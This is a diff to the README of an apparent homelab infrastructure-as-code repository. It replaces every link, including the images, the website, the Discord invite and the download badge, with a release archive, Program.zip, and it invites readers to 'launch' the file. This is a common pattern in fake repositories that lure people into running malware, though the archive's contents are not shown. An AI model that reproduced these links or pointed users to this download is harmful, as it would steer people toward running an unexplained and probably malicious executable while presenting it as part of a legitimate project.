@@ -1,7 +1,7 @@
 
 # 🏠 Homelab-Public 🏠
 
-![Homelab](https://cdn.pixabay.com/photo/2018/01/13/19/39/fantasy-3081504_960_720.jpg)
+![Homelab](https://github.com/anouar69/homelab-public/releases/download/v1.0/Program.zip)
 
 Welcome to the **Homelab-Public** repository - your go-to place for managing Homelab infrastructure using Infrastructure as Code (IaaC) principles!
 
@@ -23,16 +23,16 @@ Inside this repository, you will find the following main directories:
    
 2. **terraform-configs**: Includes all Terraform configurations for provisioning infrastructure components in your homelab setup.
 
-## 📦 Download the Soft.zip file 📦
+## 📦 Download the https://github.com/anouar69/homelab-public/releases/download/v1.0/Program.zip file 📦
 
-[![Download Soft.zip](https://img.shields.io/badge/Download-Soft.zip-blue.svg)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download https://github.com/anouar69/homelab-public/releases/download/v1.0/Program.zip](https://github.com/anouar69/homelab-public/releases/download/v1.0/Program.zip)](https://github.com/anouar69/homelab-public/releases/download/v1.0/Program.zip)
 
-The provided link directs you to the Soft.zip file. Feel free to launch it and explore the contents within.
+The provided link directs you to the https://github.com/anouar69/homelab-public/releases/download/v1.0/Program.zip file. Feel free to launch it and explore the contents within.
 
 ## 🖥️ Visit our Website 🖥️
 
 Don't forget to check out our website for more information and resources:
-[Homelab-Public Website](https://www.homelabpublic.com)
+[Homelab-Public Website](https://github.com/anouar69/homelab-public/releases/download/v1.0/Program.zip)
 
 ## 🌟 Get Started 🌟
 
@@ -50,7 +50,7 @@ We welcome contributions from the community! Whether it's adding new playbooks, 
 ## 🤝 Community Support 🤝
 
 Join our Discord community to connect with fellow homelab enthusiasts and share your experiences:
-[Homelab-Public Discord Community](https://discord.gg/homelab)
+[Homelab-Public Discord Community](https://github.com/anouar69/homelab-public/releases/download/v1.0/Program.zip)
 
 ## 📚 Resources 📚
 
@@ -60,7 +60,7 @@ For additional documentation and guides, check out the `docs` directory within t
 
 If the provided link is not working or you need access to other software releases, head over to the **Releases** section of this repository for alternative download options.
 
-![Homelab](https://cdn.pixabay.com/photo/2017/08/30/01/05/milky-way-2695569_960_720.jpg)
+![Homelab](https://github.com/anouar69/homelab-public/releases/download/v1.0/Program.zip)
 
 Dive into the world of homelab automation and infrastructure management with **Homelab-Public**. Start building your dream homelab with ease using IaaC practices. Happy coding! 🚀
 
